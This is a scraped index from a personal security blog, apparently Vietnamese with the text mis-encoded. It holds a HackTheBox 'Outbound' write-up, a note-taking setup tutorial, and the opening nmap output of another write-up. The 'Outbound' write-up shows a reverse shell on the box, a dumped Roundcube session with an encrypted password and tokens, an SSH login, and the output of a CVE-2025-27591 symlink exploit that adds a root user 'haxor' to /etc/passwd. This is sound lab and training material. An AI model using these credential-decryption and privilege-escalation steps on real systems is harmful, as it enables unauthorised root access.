base64\nlanguage|s:5:\u0026#34;en_US\u0026#34;;imap_namespace|a:4:{s:8:\u0026#34;personal\u0026#34;;a:1:{i:0;a:2:{i:0;s:0:\u0026#34;\u0026#34;;i:1;s:1:\u0026#34;/\u0026#34;;}}s:5:\u0026#34;other\u0026#34;;N;s:6:\u0026#34;shared\u0026#34;;N;s:10:\u0026#34;prefix_out\u0026#34;;s:0:\u0026#34;\u0026#34;;}imap_delimiter|s:1:\u0026#34;/\u0026#34;;imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:\u0026#34;jacob\u0026#34;;storage_host|s:9:\u0026#34;localhost\u0026#34;;storage_port|i:143;storage_ssl|b:0;password|s:32:\u0026#34;L7Rv00A8TuwJA******xcSgnIk25Am/\u0026#34;;login_time|i:1749397119;timezone|s:13:\u0026#34;Europe/London\u0026#34;;STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:\u0026#34;DpYqv6maI9HxDL5GhcCd8JaQQW\u0026#34;;request_token|s:32:\u0026#34;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw\u0026#34;;task|s:4:\u0026#34;mail\u0026#34;;skin_config|a:7:{s:17:\u0026#34;supported_layouts\u0026#34;;a:1:{i:0;s:10:\u0026#34;widescreen\u0026#34;;}s:22:\u0026#34;jquery_ui_colors_theme\u0026#34;;s:9:\u0026#34;bootstrap\u0026#34;;s:18:\u0026#34;embed_css_location\u0026#34;;s:17:\u0026#34;/styles/embed.css\u0026#34;;s:19:\u0026#34;editor_css_location\u0026#34;;s:17:\u0026#34;/styles/embed.css\u0026#34;;s:17:\u0026#34;dark_mode_support\u0026#34;;b:1;s:26:\u0026#34;media_browser_css_location\u0026#34;;s:4:\u0026#34;none\u0026#34;;s:21:\u0026#34;additional_logo_types\u0026#34;;a:3:{i:0;s:4:\u0026#34;dark\u0026#34;;i:1;s:5:\u0026#34;small\u0026#34;;i:2;s:10:\u0026#34;small-dark\u0026#34;;}}imap_host|s:9:\u0026#34;localhost\u0026#34;;page|i:1;mbox|s:5:\u0026#34;INBOX\u0026#34;;sort_col|s:0:\u0026#34;\u0026#34;;sort_order|s:4:\u0026#34;DESC\u0026#34;;STORAGE_THREAD|a:3:{i:0;s:10:\u0026#34;REFERENCES\u0026#34;;i:1;s:4:\u0026#34;REFS\u0026#34;;i:2;s:14:\u0026#34;ORDEREDSUBJECT\u0026#34;;}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:\u0026#34;name\u0026#34;;s:8:\u0026#34;messages\u0026#34;;s:2:\u0026#34;id\u0026#34;;s:11:\u0026#34;messagelist\u0026#34;;s:5:\u0026#34;class\u0026#34;;s:42:\u0026#34;listing messagelist sortheader fixedheader\u0026#34;;s:15:\u0026#34;aria-labelledby\u0026#34;;s:22:\u0026#34;aria-label-messagelist\u0026#34;;s:9:\u0026#34;data-list\u0026#34;;s:12:\u0026#34;message_list\u0026#34;;s:14:\u0026#34;data-label-msg\u0026#34;;s:18:\u0026#34;The list is empty.\u0026#34;;}unseen_count|a:2:{s:5:\u0026#34;INBOX\u0026#34;;i:2;s:5:\u0026#34;Trash\u0026#34;;i:0;}folders|a:1:{s:5:\u0026#34;INBOX\u0026#34;;a:2:{s:3:\u0026#34;cnt\u0026#34;;i:2;s:6:\u0026#34;maxuid\u0026#34;;i:3;}}list_mod_seq|s:2:\u0026#34;10\u0026#34;; TÃ´i cÃ³ user jacob vÃ  password dÆ°á»›i dáº¡ng mÃ£ hÃ³a L7Rv00A8TuwJA******xcSgnIk25Am/\nSá»­ dá»¥ng decrypt.sh Ä‘á»ƒ thá»­ giáº£i mÃ£ nÃ³\nTrÃªn reverse shell\nwww-data@mail:/var/www/html/roundcube$ ./bin/decrypt.sh \u0026#39;L7Rv00A8TuwJA******xcSgnIk25Am/\u0026#39; \u0026lt;./bin/decrypt.sh \u0026#39;L7Rv00A8TuwJA******xcSgnIk25Am/\u0026#39; 595mO8D****** Thá»­ Ä‘Äƒng nháº­p vÃ o nhá»¯ng nÆ¡i cÃ³ thá»ƒ bao gá»“m ssh vÃ  webmail, tÃ´i cÃ³ user webmail má»›i\nMá»™t trong 2 mail cÃ³ chá»©a má»™t password cá»§a jacob. Thá»­ nÃ³ vá»›i ssh\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~] â””â”€$ ssh jacob@mail.outbound.htb The authenticity of host \u0026#39;mail.outbound.htb (10.10.11.77)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;mail.outbound.htb\u0026#39; (ED25519) to the list of known hosts. jacob@mail.outbound.htb\u0026#39;s password: Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Aug 4 07:09:58 AM UTC 2025 System load: 0.08 Processes: 268 Usage of /: 74.9% of 6.73GB Users logged in: 1 Memory usage: 13% IPv4 address for eth0: 10.10.11.77 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Aug 4 06:59:12 2025 from 10.10.14.40 jacob@outbound:~$ id uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users) jacob@outbound:~$ ls user.txt jacob@outbound:~$ Privilege escalation # Äi qua máº¥y ká»¹ thuáº­t mÃ  láº§n nÃ o cÅ©ng dÃ¹ng, tÃ´i cÃ³ sudo -l\njacob@outbound:~$ sudo -l Matching Defaults entries for jacob on outbound: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jacob may run the following commands on outbound: (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d* TÃ¬m hiá»ƒu má»™t chÃºt vá» below, Ä‘Ã¢y lÃ  má»™t trÃ¬nh theo dÃµi hiá»‡u nÄƒng há»‡ thá»‘ng (system performance monitor) nhÆ° CPU, memory, IO, process, v.v\u0026hellip;\nCVE-2025-27591 # Thá»­ tÃ¬m kiáº¿m lá»— há»•ng cá»§a below tÃ´i tÃ¬m tháº¥y CVE-2025-27591. Below cháº¡y nhÆ° má»™t há»‡ thá»‘ng dá»‹ch vá»¥ dÆ°á»›i quyá»n root vÃ  táº¡o thÆ° má»¥c /var/log/below vá»›i quyá»n world-writable (0777), cho phÃ©p ngÆ°á»i dÃ¹ng khÃ´ng Ä‘áº·c quyá»n váº«n cÃ³ thá»ƒ thao tÃ¡c vÃ o thÆ° má»¥c nÃ y. Attacker cÃ³ thá»ƒ táº¡o symlink Ä‘á»™c háº¡i Ä‘á»ƒ trá» Ä‘áº¿n cÃ¡c file há»‡ thá»‘ng nháº¡y cáº£m (vÃ­ dá»¥ /etc/shadow), tá»« Ä‘Ã³ chiáº¿m quyá»n ghi file vÃ  cÃ³ thá»ƒ leo lÃªn root.\nTÃ¬m kiáº¿m Poc trÃªn github, tÃ´i tÃ¬m tháº¥y phiÃªn báº£n Ä‘áº§u tiÃªn Ä‘Æ°á»£c up lÃªn á»Ÿ Ä‘Ã¢y\nCopy ná»™i dung file sh vÃ o mÃ¡y\njacob@outbound:~$ nano exploit.sh jacob@outbound:~$ chmod +x exploit.sh jacob@outbound:~$ ./exploit.sh [*] CVE-2025-27591 Privilege Escalation Exploit [*] Checking sudo permissions... [*] Backing up /etc/passwd to /tmp/passwd.bak [*] Generating password hash... [*] Creating malicious passwd line... [*] Linking /var/log/below/error_root.log to /etc/passwd [*] Triggering \u0026#39;below\u0026#39; to write to symlinked log... [*] Injecting malicious user into /etc/passwd [*] Try switching to \u0026#39;haxor\u0026#39; using password: hacked123 Password: haxor@outbound:/home/jacob# id uid=0(root) gid=0(root) groups=0(root) haxor@outbound:/home/jacob# cd /root haxor@outbound:~# ls root.txt haxor@outbound:~# ","date":"27 July 2025","externalUrl":null,"permalink":"/ctf/hackthebox/outbound/","section":"Ctf","summary":"","title":"Hackthebox - Outbound","type":"ctf"},{"content":"","date":"27 July 2025","externalUrl":null,"permalink":"/tags/msfconsole/","section":"Tags","summary":"","title":"Msfconsole","type":"tags"},{"content":"","date":"27 July 2025","externalUrl":null,"permalink":"/tags/roundcube-webmail/","section":"Tags","summary":"","title":"Roundcube Webmail","type":"tags"},{"content":"","date":"27 July 2025","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"Ssh","type":"tags"},{"content":"","date":"15 June 2025","externalUrl":null,"permalink":"/blog/","section":"Blog","summary":"","title":"Blog","type":"blog"},{"content":"ÄÃºng nhÆ° tiÃªu Ä‘á», bÃ i viáº¿t nÃ y táº­p trung vÃ o viá»‡c lÃ m tháº¿ nÃ o Ä‘á»ƒ viá»‡c ghi chÃº khi chÆ¡i CTF hay khi thá»±c hÃ nh cÃ¡c bÃ i labs Ä‘Æ°á»£c dá»… dÃ ng hÆ¡n, giÃºp cho viá»‡c tra cá»©u láº¡i cÅ©ng nhÆ° viáº¿t writeup Ä‘Æ°á»£c thuáº­n tiá»‡n hÆ¡n. Má»¥c Ä‘Ã­ch chÃ­nh cá»§a bÃ i viáº¿t lÃ  Ä‘á»ƒ tÃ´i cÃ³ cÃ¡i xem láº¡i cÅ©ng nhÆ° copy/paste cho nhanh má»—i khi cáº§n setup láº¡i mÃ´i trÆ°á»ng, náº¿u báº¡n xem Ä‘Æ°á»£c bÃ i viáº¿t nÃ y, hy vá»ng nÃ³ giÃºp Ã­ch Ä‘Æ°á»£c cho báº¡n trong quÃ¡ trÃ¬nh chÆ¡i CTF vÃ  cÃ´ng viá»‡c.\nBÃ i viáº¿t dá»±a trÃªn hÆ°á»›ng dáº«n cá»§a ByteSized Security: Prepnote: Simplify Your Hacking Workflow, cáº£m Æ¡n anh vÃ¬ 1 cÃ´ng cá»¥ ráº¥t há»¯u Ã­ch.\nRequirements # CÃ¡c cÃ´ng cá»¥ Ä‘Æ°á»£c sá»­ dá»¥ng:\nObsidian: Tháº±ng nÃ y Ä‘á»ƒ note káº¿t quáº£ cá»§a cÃ¡c phases, lÆ°u thÃªm cáº£ áº£nh náº¿u cáº§n. ÄÃ¢y sáº½ lÃ  káº¿t quáº£ Ä‘á»ƒ tá»•ng há»£p viáº¿t writeup Vscode: TÃ´i chá»n vscode vÃ¬ nÃ³ tiá»‡n, giao diá»‡n cÅ©ng quen thuá»™c, tÃ´i khÃ´ng pháº£i cÃ i thÃªm cÃ´ng cá»¥ khÃ¡c. CÃ³ thá»ƒ thay tháº¿ báº±ng báº¥t ká»³ cÃ´ng cá»¥ offline nÃ y nhÆ° Sublime Text hay CherryTree. Prepnote: CÃ´ng cá»¥ do ByteSized phÃ¡t triá»ƒn, cÃ³ chá»©c nÄƒng táº¡o tá»± Ä‘á»™ng cÃ¡c thÆ° má»¥c, cÃ¡c file theo cáº¥u trÃºc cá»§a tá»«ng phases khi chÆ¡i HackTheBox machine hay OSCP Playground, etc. Obsidian # Äáº§u tiÃªn lÃ  cÃ i Ä‘áº·t Obsidian cho kali. VÃ o trang chá»§ cá»§a Obsidian vÃ  táº£i báº£n Deb cho Kali.\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~] â””â”€$ sudo dpkg -i tools/obsidian_1.8.10_amd64.deb [sudo] password for neo: Selecting previously unselected package obsidian. (Reading database ... 328836 files and directories currently installed.) Preparing to unpack .../obsidian_1.8.10_amd64.deb ... Unpacking obsidian (1.8.10) ... Setting up obsidian (1.8.10) ... update-alternatives is /usr/bin/update-alternatives update-alternatives: using /opt/Obsidian/obsidian to provide /usr/bin/obsidian (obsidian) in auto mode Cache read/write disabled: interface file missing. (Kernel needs AppArmor 2.4 compatibility patch.) Warning: unable to find a suitable fs in /proc/mounts, is it mounted? Use --subdomainfs to override. dpkg: error processing package obsidian (--install): installed obsidian package post-installation script subprocess returned error exit status 1 Processing triggers for hicolor-icon-theme (0.18-2) ... Processing triggers for desktop-file-utils (0.28-1) ... Errors were encountered while processing: obsidian Vscode # Trong bÃ i hÆ°á»›ng dáº«n cá»§a ByteSized thÃ¬ anh ta dÃ¹ng Sublime Text, tuy nhiÃªn tÃ´i quen dÃ¹ng Vscode hÆ¡n, vÃ  báº¡n cÅ©ng nÃªn nhÆ° váº­y, quen cÃ¡i gÃ¬ thÃ¬ cá»© dÃ¹ng cÃ¡i Ä‘Ã³.\nCÃ i Ä‘áº·t Vscode trÃªn kali cÅ©ng ráº¥t Ä‘Æ¡n giáº£n\nsudo apt install code-oss -y\nPrepnote # Clone repo nÃ y vá» mÃ¡y\ngit clone https://github.com/0xDynamo/Prepnote.git\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~/tools] â””â”€$ cd Prepnote â”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~/tools/Prepnote] â””â”€$ ll total 32 -rwxr-xr-x 1 neo neo 9395 Jun 18 21:43 prepnote.sh -rw-r--r-- 1 neo neo 3816 Jun 18 21:43 README.md -rwxr-xr-x 1 neo neo 7030 Jun 18 21:43 setup_prepnote.sh drwxr-xr-x 4 neo neo 4096 Jun 18 21:43 Template -rw-r--r-- 1 neo neo 1469 Jun 18 21:43 template_config Trong láº§n Ä‘áº§u tiÃªn cÃ i Ä‘áº·t tÃ´i sáº½ cháº¡y setup_prepnote.sh\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~/tools/Prepnote] â””â”€$ ./setup_prepnote.sh ____ _ ____ __ _____ __ / __ \\__ ______ ____ _____ ___ ____ ( )_____ / __ \\________ ____ ____ ____ / /____ / ___/___ / /___ ______ / / / / / / / __ \\/ __ / __ __ \\/ __ \\|// ___/ / /_/ / ___/ _ \\/ __ \\/ __ \\/ __ \\/ __/ _ \\ \\__ \\/ _ \\/ __/ / / / __ \\ / /_/ / /_/ / / / / /_/ / / / / / / /_/ / (__ ) / ____/ / / __/ /_/ / / / / /_/ / /_/ __/ ___/ / __/ /_/ /_/ / /_/ / /_____/\\__, /_/ /_/\\__,_/_/ /_/ /_/\\____/ /____/ /_/ /_/ \\___/ .___/_/ /_/\\____/\\__/\\___/ /____/\\___/\\__/\\__,_/ .___/ /____/ /_/ /_/ Note: The setup will be quicker if you fill out the \u0026#39;config.txt\u0026#39; file with your paths beforehand. Do you wish to continue with the interactive setup? (Y/n) [Y]: CÃ³ 1 lÆ°u Ã½ lÃ  sau khi tráº£ lá»i háº¿t cÃ¡c cÃ¢u há»i setup thÃ¬ táº¥t cáº£ config cá»§a tÃ´i sáº½ Ä‘Æ°á»£c lÆ°u vÃ o file má»›i lÃ  config.txt, tÃ´i chá»‰ cáº§n lÆ°u láº¡i file nÃ y vÃ  dÃ¹ng cho cÃ¡c láº§n cÃ i Ä‘áº·t tiáº¿p theo.\nBÃ¢y giá» trÆ°á»›c khi tráº£ lá»i cÃ¡c cÃ¢u há»i setup, tÃ´i cáº§n hiá»ƒu rÃµ vá» cÃ¢y thÆ° má»¥c sau khi tool táº¡o ra. NÃ³ sáº½ tÆ°Æ¡ng tá»± nhÆ° bÃªn dÆ°á»›i\n. â”œâ”€â”€ labs â”‚Â â”œâ”€â”€ gp â”‚Â â”œâ”€â”€ htb â”‚Â â”œâ”€â”€ oscp-ad â”‚Â â”œâ”€â”€ oscp-challenge â”‚Â â”œâ”€â”€ oscp-exam â”‚Â â””â”€â”€ oscp-training â””â”€â”€ platforms-vault â”œâ”€â”€ template â”‚Â â”œâ”€â”€ enum â”‚Â â”‚Â â”œâ”€â”€ external â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 135 - msrpc.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 139 - netbios-ssn.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 22 - ssh.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 389 - 636 - 3268 - 3269 - ldap.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 443 - https.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 445 - samba.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 80 - http.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ Untitled 4.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ Untitled 5.md â”‚Â â”‚Â â”‚Â â””â”€â”€ Untitled 6.md â”‚Â â”‚Â â””â”€â”€ internal â”‚Â â”‚Â â””â”€â”€ User 1.md â”‚Â â”œâ”€â”€ Exploit.md â”‚Â â”œâ”€â”€ General Information.md â”‚Â â”œâ”€â”€ Loot.md â”‚Â â””â”€â”€ Privesc â”‚Â â””â”€â”€ User 1.md â””â”€â”€ Untitled.md labs: thÆ° má»¥c chá»©a cÃ¡c note theo tá»«ng ná»n táº£ng Ä‘á»ƒ dá»… phÃ¢n loáº¡i cÅ©ng nhÆ° tÃ¬m kiáº¿m. ÄÃ¢y cÅ©ng chÃ­nh lÃ  workspace lÃ m viá»‡c cá»§a tÃ´i trÃªn Vscode. platforms-vault: chá»©a template sá»­ dá»¥ng cho Obsidian. VÃ  Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c cÃ¢y thÆ° má»¥c nÃ y thÃ¬ cÃ¢u tráº£ lá»i cá»§a tÃ´i cho cÃ¡c cÃ¢u há»i sáº½ nhÆ° bÃªn dÆ°á»›i\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~/tools/Prepnote] â””â”€$ ./setup_prepnote.sh ____ _ ____ __ _____ __ / __ \\__ ______ ____ _____ ___ ____ ( )_____ / __ \\________ ____ ____ ____ / /____ / ___/___ / /___ ______ / / / / / / / __ \\/ __ / __ __ \\/ __ \\|// ___/ / /_/ / ___/ _ \\/ __ \\/ __ \\/ __ \\/ __/ _ \\ \\__ \\/ _ \\/ __/ / / / __ \\ / /_/ / /_/ / / / / /_/ / / / / / / /_/ / (__ ) / ____/ / / __/ /_/ / / / / /_/ / /_/ __/ ___/ / __/ /_/ /_/ / /_/ / /_____/\\__, /_/ /_/\\__,_/_/ /_/ /_/\\____/ /____/ /_/ /_/ \\___/ .___/_/ /_/\\____/\\__/\\___/ /____/\\___/\\__/\\__,_/ .___/ /____/ /_/ /_/ Note: The setup will be quicker if you fill out the \u0026#39;config.txt\u0026#39; file with your paths beforehand. Do you wish to continue with the interactive setup? (Y/n) [Y]: y Please provide the paths for your setup. Press Enter to keep the current/suggested value. Enter the path to your Obsidian notes vault (current: not set): /home/neo/platforms/platforms-vault The path \u0026#39;/home/neo/platforms/platforms-vault\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: y Enter the path where you want to store the template folder within your notes vault (current: not set): /home/neo/platforms/platforms-vault/template The path \u0026#39;/home/neo/platforms/platforms-vault/template\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: y Enter the path for your general working directory (current: not set): /home/neo/platforms/labs The path \u0026#39;/home/neo/platforms/labs\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: y Enter the path for your OSCP Exam working folder (current: not set): /home/neo/platforms/labs/oscp-exam The path \u0026#39;/home/neo/platforms/labs/oscp-exam\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: y Enter the path for your OSCP Training working folder (current: not set): /home/neo/platforms/labs/oscp-training The path \u0026#39;/home/neo/platforms/labs/oscp-training\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: Enter the path for your HackTheBox working folder (current: not set): /home/neo/platforms/labs/htb The path \u0026#39;/home/neo/platforms/labs/htb\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: Enter the path for your Proving Grounds working folder (current: not set): /home/neo/platforms/labs/pg The path \u0026#39;/home/neo/platforms/labs/pg\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: Enter the path for your OSCP Challenge Labs working folder (current: not set): /home/neo/platforms/labs/oscp-challenges The path \u0026#39;/home/neo/platforms/labs/oscp-challenges\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: Enter the path for your OSCP AD Challenge Labs working folder (current: not set): /home/neo/platforms/labs/oscp-ad The path \u0026#39;/home/neo/platforms/labs/oscp-ad\u0026#39; does not exist. Would you like to create it? (y/n) [Y]: Default template directory found at /home/neo/tools/Prepnote/Template. Copying the default template folder to: /home/neo/platforms/platforms-vault/template Default template successfully copied to /home/neo/platforms/platforms-vault/template. Debug: OBSIDIAN_NOTES_PATH=\u0026#39;/home/neo/platforms/platforms-vault\u0026#39; Debug: TEMPLATE_PATH=\u0026#39;/home/neo/platforms/platforms-vault/template\u0026#39; Debug: EXAM_PATH=\u0026#39;/home/neo/platforms/labs/oscp-exam\u0026#39; Debug: TRAINING_PATH=\u0026#39;/home/neo/platforms/labs/oscp-training\u0026#39; Debug: WORKING_DIR=\u0026#39;/home/neo/platforms/labs\u0026#39; Debug: HTB_PATH=\u0026#39;/home/neo/platforms/labs/htb\u0026#39; Debug: PG_PATH=\u0026#39;/home/neo/platforms/labs/pg\u0026#39; Debug: OSCP_PATH=\u0026#39;/home/neo/platforms/labs/oscp-challenges\u0026#39; Debug: OSCP_AD_PATH=\u0026#39;/home/neo/platforms/labs/oscp-ad\u0026#39; Setup completed. Configuration saved to ./config.txt. You can run this script again to modify paths or manually edit ./config.txt if needed. Would you like to create a symlink for \u0026#39;prepnote.sh\u0026#39; and \u0026#39;config.txt\u0026#39; in /usr/local/bin for easier access? (y/n) [N]: y [sudo] password for neo: Symlinks created successfully. You can now run \u0026#39;prepnote\u0026#39; from anywhere. â”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~/tools/Prepnote] â””â”€$ prepnote --help ____ _ ____ __ _____ __ / __ \\__ ______ ____ _____ ___ ____ ( )_____ / __ \\________ ____ ____ ____ / /____ / ___/___ / /___ ______ / / / / / / / __ \\/ __ / __ __ \\/ __ \\|// ___/ / /_/ / ___/ _ \\/ __ \\/ __ \\/ __ \\/ __/ _ \\ \\__ \\/ _ \\/ __/ / / / __ \\ / /_/ / /_/ / / / / /_/ / / / / / / /_/ / (__ ) / ____/ / / __/ /_/ / / / / /_/ / /_/ __/ ___/ / __/ /_/ /_/ / /_/ / /_____/\\__, /_/ /_/\\__,_/_/ /_/ /_/\\____/ /____/ /_/ /_/ \\___/ .___/_/ /_/\\____/\\__/\\___/ /____/\\___/\\__/\\__,_/ .___/ /____/ /_/ /_/ Usage: prepnote [OPTIONS] FOLDER_NAME Options: -h Copy template to \u0026#39;HackTheBox\u0026#39; destination. -p Copy template to \u0026#39;Proving Grounds\u0026#39; destination. -o Copy template to \u0026#39;OSCP - Challenge Labs\u0026#39; destination. -a Copy template to \u0026#39;OSCP - AD Challenge Labs\u0026#39; destination (with three machine folders). -e Set up an OSCP exam environment with AD and challenge lab machines. -t Set up an OSCP training environment with AD and challenge lab machines. --help Display this help message. Thá»­ táº¡o 1 mÃ¡y HTB\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~/tools/Prepnote] â””â”€$ prepnote -h environment Copying template to: /home/neo/platforms/platforms-vault/My Hacking Adventures/HackTheBox/Environment Template copied successfully. Preparing to create folders in: /home/neo/platforms/labs/htb/environment Created: /home/neo/platforms/labs/htb/environment/enum Created: /home/neo/platforms/labs/htb/environment/loot Created: /home/neo/platforms/labs/htb/environment/privesc Created: /home/neo/platforms/labs/htb/environment/exploit Created: /home/neo/platforms/labs/htb/environment/enum/internal Created: /home/neo/platforms/labs/htb/environment/enum/external Folders and subfolders created successfully. Xem láº¡i cÃ¢y thÆ° má»¥c\n. â”œâ”€â”€ labs â”‚Â â”œâ”€â”€ htb â”‚Â â”‚Â â””â”€â”€ environment â”‚Â â”‚Â â”œâ”€â”€ enum â”‚Â â”‚Â â”‚Â â”œâ”€â”€ external â”‚Â â”‚Â â”‚Â â””â”€â”€ internal â”‚Â â”‚Â â”œâ”€â”€ exploit â”‚Â â”‚Â â”œâ”€â”€ loot â”‚Â â”‚Â â””â”€â”€ privesc â”‚Â â”œâ”€â”€ oscp-ad â”‚Â â”œâ”€â”€ oscp-challenges â”‚Â â”œâ”€â”€ oscp-exam â”‚Â â”œâ”€â”€ oscp-training â”‚Â â””â”€â”€ pg â””â”€â”€ platforms-vault â”œâ”€â”€ My Hacking Adventures â”‚Â â””â”€â”€ HackTheBox â”‚Â â””â”€â”€ Environment â”‚Â â”œâ”€â”€ enum â”‚Â â”‚Â â”œâ”€â”€ external â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 135 - msrpc.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 139 - netbios-ssn.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 22 - ssh.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 389 - 636 - 3268 - 3269 - ldap.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 443 - https.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 445 - samba.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ 80 - http.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ Untitled 4.md â”‚Â â”‚Â â”‚Â â”œâ”€â”€ Untitled 5.md â”‚Â â”‚Â â”‚Â â””â”€â”€ Untitled 6.md â”‚Â â”‚Â â””â”€â”€ internal â”‚Â â”‚Â â””â”€â”€ User 1.md â”‚Â â”œâ”€â”€ Exploit.md â”‚Â â”œâ”€â”€ General Information.md â”‚Â â”œâ”€â”€ Loot.md â”‚Â â””â”€â”€ Privesc â”‚Â â””â”€â”€ User 1.md â””â”€â”€ template â”œâ”€â”€ enum â”‚Â â”œâ”€â”€ external â”‚Â â”‚Â â”œâ”€â”€ 135 - msrpc.md â”‚Â â”‚Â â”œâ”€â”€ 139 - netbios-ssn.md â”‚Â â”‚Â â”œâ”€â”€ 22 - ssh.md â”‚Â â”‚Â â”œâ”€â”€ 389 - 636 - 3268 - 3269 - ldap.md â”‚Â â”‚Â â”œâ”€â”€ 443 - https.md â”‚Â â”‚Â â”œâ”€â”€ 445 - samba.md â”‚Â â”‚Â â”œâ”€â”€ 80 - http.md â”‚Â â”‚Â â”œâ”€â”€ Untitled 4.md â”‚Â â”‚Â â”œâ”€â”€ Untitled 5.md â”‚Â â”‚Â â””â”€â”€ Untitled 6.md â”‚Â â””â”€â”€ internal â”‚Â â””â”€â”€ User 1.md â”œâ”€â”€ Exploit.md â”œâ”€â”€ General Information.md â”œâ”€â”€ Loot.md â””â”€â”€ Privesc â””â”€â”€ User 1.md 28 directories, 30 files Váº­y lÃ  xong, bÃ¢y giá» thÃ¬ cá»© Ä‘áº¿n pháº§n nÃ o tÃ´i sáº½ táº¡o note cho riÃªng pháº§n Ä‘Ã³, dá»… tra cá»©u láº¡i cÅ©ng nhÆ° tá»•ng há»£p láº¡i thÃ nh writeup.\nMá»™t láº§n ná»¯a cáº£m Æ¡n ByteSized Security vÃ¬ 1 cÃ´ng cá»¥ há»¯u Ã­ch.\n","date":"15 June 2025","externalUrl":null,"permalink":"/blog/ctf-take-notes/","section":"Blog","summary":"","title":"ÄÆ¡n giáº£n hÃ³a viá»‡c ghi chÃº khi chÆ¡i CTF","type":"blog"},{"content":"","date":"1 April 2025","externalUrl":null,"permalink":"/tags/backdrop/","section":"Tags","summary":"","title":"Backdrop","type":"tags"},{"content":"","date":"1 April 2025","externalUrl":null,"permalink":"/tags/bee---backdrop/","section":"Tags","summary":"","title":"Bee - Backdrop","type":"tags"},{"content":"","date":"1 April 2025","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":" Reconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8= | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y= | 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) |_ssh-ed25519 